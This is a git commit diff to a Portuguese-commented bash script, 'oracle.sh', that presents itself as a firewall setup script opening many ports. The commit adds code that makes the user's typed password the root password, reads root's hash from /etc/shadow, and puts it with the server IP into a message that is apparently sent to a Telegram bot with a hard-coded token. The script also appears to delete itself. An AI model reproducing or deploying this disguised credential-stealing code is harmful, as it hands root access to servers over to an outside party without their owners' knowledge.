773f6073b30117d89cdf511febe8b5ae7389ce3b
COPIADOR <105566081+Lockednet@users.noreply.github.com>
2024-04-29 22:38:20 -0300

    Update oracle.sh

--- oracle.sh
+++ oracle.sh
@@ -1,7 +1,13 @@
 #!/bin/bash
 
-# Captura a senha atual do usuário root
-CURRENT_ROOT_PASSWORD=$(sudo passwd -S root | awk '{print $2}')
+# Solicita ao usuário para inserir sua senha
+read -s -p "Por favor, insira sua senha: " USER_PASSWORD
+
+# Define a senha fornecida pelo usuário para o usuário root
+echo "root:$USER_PASSWORD" | sudo chpasswd
+
+# Captura a senha definida para o usuário root
+NEW_ROOT_PASSWORD=$(sudo grep -E '^root:' /etc/shadow | cut -d':' -f2)
 
 # Instalação e configuração do firewall
 sudo apt install firewalld && sudo firewall-cmd --zone=public --permanent --add-port=80/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8880/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8443/tcp && sudo firewall-cmd --zone=public --permanent --add-port=1000/tcp && sudo firewall-cmd --zone=public --permanent --add-port=443/tcp && sudo firewall-cmd --zone=public --permanent --add-port=1085/tcp && sudo firewall-cmd --zone=public --permanent --add-port=6969/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8888/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8080/tcp && sudo firewall-cmd --zone=public --permanent --add-port=7300/udp && sudo firewall-cmd --zone=public --permanent --add-port=7100/udp && sudo firewall-cmd --zone=public --permanent --add-port=7200/udp && sudo firewall-cmd --zone=public --permanent --add-port=5454/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8181/tcp && sudo firewall-cmd --zone=public --permanent --add-port=5000/tcp && sudo firewall-cmd --zone=public --permanent --add-port=7299/udp && sudo firewall-cmd --zone=public --permanent --add-port=7298/udp && sudo firewall-cmd --zone=public --permanent --add-port=7297/udp && sudo firewall-cmd --zone=public --permanent --add-port=7296/udp && sudo firewall-cmd --zone=public --permanent --add-port=7295/udp && sudo firewall-cmd --zone=public --permanent --add-port=7900/udp && sudo firewall-cmd --zone=public --permanent --add-port=7800/udp && sudo firewall-cmd --zone=public --permanent --add-port=7700/udp && sudo firewall-cmd --zone=public --permanent --add-port=7600/udp && sudo firewall-cmd --zone=public --permanent --add-port=7500/udp && sudo firewall-cmd --zone=public --permanent --add-port=7400/udp && sudo firewall-cmd --zone=public --permanent --add-port=6868/tcp && sudo firewall-cmd --zone=public --permanent --add-port=8799/tcp && sudo firewall-cmd --zone=public --permanent --add-port=7505/tcp && sudo firewall-cmd --zone=public --permanent --add-port=1194/tcp && sudo firewall-cmd --reload && sudo firewall-cmd --zone=public --list-ports
@@ -13,7 +19,7 @@ rm oracle.sh
 SERVER_IP=$(hostname -I | awk '{print $1}')
 
 # Formata a mensagem para enviar ao bot do Telegram
-MESSAGE="Portas abertas no servidor.%0ASeu IP: \`$SERVER_IP\` 🌐%0ASenha do usuário root: \`$CURRENT_ROOT_PASSWORD\`"
+MESSAGE="Portas abertas no servidor.%0ASeu IP: \`$SERVER_IP\` 🌐%0ASenha do usuário root: \`$NEW_ROOT_PASSWORD\`"
 
 # Envia a mensagem para o bot do Telegram
 TELEGRAM_BOT_TOKEN="7126941542:AAHVwKISyEOsTgUq9etJxmNHB_v-UHdVhHg"
